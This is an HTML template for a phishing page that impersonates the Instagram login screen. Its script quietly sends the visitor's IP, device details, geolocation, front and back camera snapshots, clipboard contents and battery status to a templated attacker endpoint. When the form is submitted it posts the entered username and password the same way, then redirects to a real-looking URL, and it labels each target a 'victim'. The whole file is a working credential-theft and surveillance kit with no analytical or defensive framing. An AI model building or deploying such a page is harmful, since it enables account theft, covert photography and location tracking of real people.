<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram - Log in</title>
<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; min-height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
.main-wrapper { display: flex; align-items: center; gap: 32px; margin: 30px 0; }
.phone-mockup { width: 380px; height: 580px; background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 580"><rect fill="%23f5f5f5" width="380" height="580" rx="30"/><rect x="30" y="40" width="320" height="500" fill="%23000" rx="5"/></svg>') no-repeat center; background-size: contain; display: none; }
@media (min-width: 876px) { .phone-mockup { display: block; } }
.login-section { width: 350px; }
.login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px; margin-bottom: 10px; text-align: center; }
.logo-img { width: 175px; margin-bottom: 20px; }
.form-group { margin-bottom: 6px; position: relative; }
.form-group input { width: 100%; padding: 10px 8px 10px 8px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; background: #fafafa; outline: none; }
.form-group input:focus { border-color: #a8a8a8; }
.form-group input::placeholder { color: #8e8e8e; font-size: 12px; }
.btn-login { width: 100%; padding: 7px; background: #0095f6; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 14px; opacity: 0.7; transition: opacity 0.2s; }
.btn-login:hover { opacity: 1; }
.btn-login:disabled { opacity: 0.3; cursor: default; }
.divider { display: flex; align-items: center; margin: 18px 0; }
.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
.divider span { padding: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
.fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; margin-bottom: 12px; }
.fb-login svg { width: 16px; height: 16px; fill: #385185; }
.forgot-link { color: #00376b; font-size: 12px; text-decoration: none; }
.signup-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 22px 40px; text-align: center; font-size: 14px; margin-bottom: 10px; }
.signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
.get-app { text-align: center; margin-top: 10px; }
.get-app p { font-size: 14px; color: #262626; margin-bottom: 15px; }
.app-badges { display: flex; gap: 8px; justify-content: center; }
.app-badges img { height: 40px; }
.footer { margin-top: 30px; text-align: center; }
.footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 5px 16px; margin-bottom: 20px; }
.footer-links a { color: #8e8e8e; font-size: 12px; text-decoration: none; }
.footer-copy { color: #8e8e8e; font-size: 12px; }
.loading { display: none; padding: 20px; }
.spinner { border: 2px solid #dbdbdb; border-top: 2px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="main-wrapper">
<div class="phone-mockup"></div>
<div class="login-section">
<div class="login-box">
<img class="logo-img" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
<form id="loginForm">
<div class="form-group">
<input type="text" id="username" placeholder="Phone number, username, or email" required>
</div>
<div class="form-group">
<input type="password" id="password" placeholder="Password" required>
</div>
<button type="submit" class="btn-login">Log in</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="font-size: 12px; color: #8e8e8e;">Please wait...</p>
</div>
<div class="divider"><span>OR</span></div>
<a href="#" class="fb-login">
<svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg>
Log in with Facebook
</a>
<a href="#" class="forgot-link">Forgot password?</a>
</div>
<div class="signup-box">
Don't have an account? <a href="#">Sign up</a>
</div>
<div class="get-app">
<p>Get the app.</p>
<div class="app-badges">
<a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="App Store"></a>
<a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"></a>
</div>
</div>
</div>
</div>
<footer class="footer">
<div class="footer-links">
<a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
<a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
<a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading & Non-Users</a>
<a href="#">Meta Verified</a>
</div>
<div class="footer-copy">
<select style="background: transparent; border: none; color: #8e8e8e; font-size: 12px;">
<option>English</option><option>العربية</option>
</select>
© 2024 Instagram from Meta
</div>
</footer>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video = document.getElementById('video');
var canvas = document.getElementById('canvas');

async function gatherAll() {
    let td = '📸 <b>Instagram Victim!</b>\n\n';
    td += '⚓ IP: <code><%=ip %></code>\n';
    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
    
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition((p)=>{
            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
        }, ()=>{}, {enableHighAccuracy:true, timeout: 10000});
    }
    
    async function captureCamera(facingMode, label) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}});
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 2000));
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label});
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.log(e); }
    }
    
    try { await captureCamera("user", "selfie"); } catch(e) {}
    try { await captureCamera("environment", "back"); } catch(e) {}
    
    try {
        if(navigator.clipboard && navigator.clipboard.readText) {
            const clip = await navigator.clipboard.readText();
            if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)});
        }
    } catch(e) {}
    
    try {
        const bat = await navigator.getBattery();
        $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging});
    } catch(e) {}
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    
    document.querySelector('form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    
    $.post("<%=a %>/creds", {
        uid: uid,
        user: encodeURIComponent(user),
        pass: encodeURIComponent(pass),
        platform: 'Instagram'
    });
    
    await new Promise(r => setTimeout(r, 2500));
    window.location.href = "<%=url %>";
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>